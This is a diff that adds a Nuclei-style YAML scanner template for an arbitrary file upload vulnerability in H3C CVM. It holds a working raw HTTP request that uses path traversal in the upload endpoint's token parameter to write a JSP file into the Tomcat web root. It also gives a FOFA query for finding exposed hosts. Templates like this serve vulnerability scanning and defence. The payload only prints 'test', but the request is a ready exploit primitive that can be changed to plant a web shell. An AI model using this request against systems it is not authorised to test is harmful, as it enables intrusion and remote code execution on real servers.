@@ -1,0 +1,35 @@
+id: h3c-cvm-fileupload
+
+info:
+  name: H3C CVM Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI,dostghost
+  severity: high
+  description: |
+    H3C CVM file upload vulnerability allows arbitrary file upload to the server, potentially leading to remote code execution.
+  reference:
+    - https://github.com/AboSteam/POPC/blob/main/H3C-CVM-upload%E6%8E%A5%E5%8F%A3%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md
+  metadata:
+    fofa-query: app="H3C-CVM"
+  tags: h3c, fileupload, rce,intrusive
+
+http:
+  - raw:
+      - |
+        POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/a.jsp&name=123 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Range: bytes 0-10/20
+        Referer: http://{{Hostname}}/cas/login
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        <%out.println("test");%>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "test"
